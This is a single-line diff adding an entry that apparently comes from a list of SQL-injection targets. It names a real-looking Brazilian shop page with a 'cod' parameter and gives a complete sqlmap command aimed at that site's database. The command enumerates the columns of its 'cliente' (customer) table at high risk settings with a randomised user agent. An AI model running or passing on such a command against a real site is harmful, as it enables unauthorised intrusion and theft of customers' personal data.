@@ -1,0 +1,1 @@
+http://www.grupofeiradorolo.com.br/produto_ver.php?cod=1752 (GET)  # sqlmap.py -u http://www.grupofeiradorolo.com.br/produto_ver.php?cod=1752 -D feiradorolo --threads 5 -v3 --random-agent --risk 3 -T cliente --columns
